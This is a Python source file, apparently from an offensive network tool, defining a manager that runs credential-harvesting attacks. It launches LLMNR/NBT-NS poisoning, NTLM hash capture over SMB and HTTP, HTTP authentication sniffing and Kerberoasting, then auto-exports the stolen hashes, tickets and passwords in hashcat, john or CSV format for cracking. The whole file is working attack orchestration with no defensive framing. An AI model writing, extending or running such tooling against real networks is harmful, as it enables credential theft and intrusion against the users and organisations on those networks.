"""Credential Harvesting Manager.

Orchestrates all credential harvesting modules.
"""

import asyncio
import logging
from dataclasses import dataclass, field
from typing import Optional, Callable, Any, Union
from datetime import datetime
from pathlib import Path

from .responder import ResponderServer, ResponderConfig, PoisonedQuery
from .ntlm import NTLMCapture, NTLMCaptureConfig, NTLMHash
from .http_sniffer import HTTPAuthSniffer, HTTPSnifferConfig, CapturedCredential
from .kerberos import KerberoastAttack, KerberoastConfig, ServiceTicket
from .ldap_enum import LDAPEnumerator, LDAPEnumConfig, ADUser

logger = logging.getLogger(__name__)

CredentialType = Union[PoisonedQuery, NTLMHash, CapturedCredential, ServiceTicket]


@dataclass
class CredsConfig:
    """Credential harvesting configuration."""
    # Network interface
    interface: str = "eth0"
    
    # Responder (LLMNR/NBT-NS)
    enable_responder: bool = True
    responder_llmnr: bool = True
    responder_nbns: bool = True
    responder_mdns: bool = False
    
    # NTLM capture
    enable_ntlm: bool = True
    ntlm_smb_port: int = 445
    ntlm_http_port: int = 80
    
    # HTTP sniffer
    enable_http_sniffer: bool = True
    http_ports: list[int] = field(default_factory=lambda: [80, 8080])
    
    # Kerberos
    enable_kerberos: bool = False  # Requires DC connection
    dc_ip: Optional[str] = None
    domain: Optional[str] = None
    kerberos_user: Optional[str] = None
    kerberos_pass: Optional[str] = None
    
    # Output
    output_dir: str = "/var/lib/momo/creds"
    auto_export: bool = True
    export_format: str = "hashcat"  # hashcat, john, csv


class CredsManager:
    """Central manager for all credential harvesting."""
    
    def __init__(self, config: Optional[CredsConfig] = None):
        self.config = config or CredsConfig()
        
        # Modules
        self._responder: Optional[ResponderServer] = None
        self._ntlm: Optional[NTLMCapture] = None
        self._http: Optional[HTTPAuthSniffer] = None
        self._kerberos: Optional[KerberoastAttack] = None
        self._ldap: Optional[LDAPEnumerator] = None
        
        # State
        self._running = False
        self._start_time: Optional[datetime] = None
        
        # Collected credentials
        self._all_creds: list[dict] = []
        
        # Callbacks
        self._on_cred_callback: Optional[Callable[[str, Any], None]] = None
    
    def on_credential(self, callback: Callable[[str, Any], None]) -> None:
        """Set callback for any captured credential.
        
        Callback receives (type_name, credential_object).
        """
        self._on_cred_callback = callback
    
    def _handle_credential(self, cred_type: str, cred: Any) -> None:
        """Handle any captured credential."""
        self._all_creds.append({
            'type': cred_type,
            'timestamp': datetime.now().isoformat(),
            'data': cred
        })
        
        if self._on_cred_callback:
            self._on_cred_callback(cred_type, cred)
        
        # Auto-export if enabled
        if self.config.auto_export:
            self._auto_export()
    
    async def start(self) -> None:
        """Start all enabled credential harvesting modules."""
        self._running = True
        self._start_time = datetime.now()
        
        # Ensure output directory exists
        Path(self.config.output_dir).mkdir(parents=True, exist_ok=True)
        
        tasks = []
        
        # Start Responder
        if self.config.enable_responder:
            responder_config = ResponderConfig(
                interface=self.config.interface,
                enable_llmnr=self.config.responder_llmnr,
                enable_nbns=self.config.responder_nbns,
                enable_mdns=self.config.responder_mdns,
            )
            self._responder = ResponderServer(responder_config)
            self._responder.on_query(
                lambda q: self._handle_credential('poisoned_query', q)
            )
            tasks.append(asyncio.create_task(self._responder.start()))
            logger.info("Responder started")
        
        # Start NTLM capture
        if self.config.enable_ntlm:
            ntlm_config = NTLMCaptureConfig(
                interface=self.config.interface,
                smb_port=self.config.ntlm_smb_port,
                http_port=self.config.ntlm_http_port,
            )
            self._ntlm = NTLMCapture(ntlm_config)
            self._ntlm.on_hash(
                lambda h: self._handle_credential('ntlm_hash', h)
            )
            tasks.append(asyncio.create_task(self._ntlm.start()))
            logger.info("NTLM capture started")
        
        # Start HTTP sniffer
        if self.config.enable_http_sniffer:
            http_config = HTTPSnifferConfig(
                interface=self.config.interface,
                ports=self.config.http_ports,
            )
            self._http = HTTPAuthSniffer(http_config)
            self._http.on_credential(
                lambda c: self._handle_credential('http_cred', c)
            )
            tasks.append(asyncio.create_task(self._http.start()))
            logger.info("HTTP sniffer started")
        
        # Start Kerberos if configured
        if self.config.enable_kerberos and self.config.dc_ip:
            kerb_config = KerberoastConfig(
                dc_ip=self.config.dc_ip,
                domain=self.config.domain or "",
                username=self.config.kerberos_user or "",
                password=self.config.kerberos_pass,
            )
            self._kerberos = KerberoastAttack(kerb_config)
            self._kerberos.on_ticket(
                lambda t: self._handle_credential('kerberos_ticket', t)
            )
            # Kerberos runs once, not continuously
            asyncio.create_task(self._run_kerberos())
        
        logger.info(f"CredsManager started with {len(tasks)} modules")
    
    async def _run_kerberos(self) -> None:
        """Run Kerberoast attack."""
        if self._kerberos:
            tickets = await self._kerberos.run()
            logger.info(f"Kerberoast completed: {len(tickets)} tickets")
    
    async def stop(self) -> None:
        """Stop all modules."""
        self._running = False
        
        if self._responder:
            await self._responder.stop()
        
        if self._ntlm:
            await self._ntlm.stop()
        
        if self._http:
            await self._http.stop()
        
        if self._kerberos:
            self._kerberos.stop()
        
        logger.info("CredsManager stopped")
    
    def _auto_export(self) -> None:
        """Auto-export credentials to files."""
        try:
            output_dir = Path(self.config.output_dir)
            
            # Export NTLM hashes
            if self._ntlm and self._ntlm.hashes:
                if self.config.export_format == "hashcat":
                    self._ntlm.export_hashcat(str(output_dir / "ntlm_hashes.txt"))
                else:
                    self._ntlm.export_john(str(output_dir / "ntlm_hashes.john"))
            
            # Export Kerberos tickets
            if self._kerberos and self._kerberos.tickets:
                self._kerberos.export_hashcat(str(output_dir / "kerberos_tickets.txt"))
            
            # Export HTTP credentials
            if self._http and self._http.credentials:
                self._http.export_csv(str(output_dir / "http_creds.csv"))
                
        except Exception as e:
            logger.error(f"Auto-export failed: {e}")
    
    @property
    def stats(self) -> dict:
        """Get current statistics."""
        return {
            'running': self._running,
            'uptime': (datetime.now() - self._start_time).total_seconds() if self._start_time else 0,
            'total_credentials': len(self._all_creds),
            'poisoned_queries': len(self._responder.queries) if self._responder else 0,
            'ntlm_hashes': len(self._ntlm.hashes) if self._ntlm else 0,
            'http_credentials': len(self._http.credentials) if self._http else 0,
            'kerberos_tickets': len(self._kerberos.tickets) if self._kerberos else 0,
        }
    
    @property
    def all_credentials(self) -> list[dict]:
        """Get all captured credentials."""
        return self._all_creds.copy()
    
    def export_all(self, directory: str) -> dict:
        """Export all credentials to directory."""
        output_dir = Path(directory)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        counts = {}
        
        if self._ntlm and self._ntlm.hashes:
            counts['ntlm'] = self._ntlm.export_hashcat(str(output_dir / "ntlm.txt"))
        
        if self._kerberos and self._kerberos.tickets:
            counts['kerberos'] = self._kerberos.export_hashcat(str(output_dir / "kerberos.txt"))
        
        if self._http and self._http.credentials:
            counts['http'] = self._http.export_csv(str(output_dir / "http.csv"))
        
        return counts

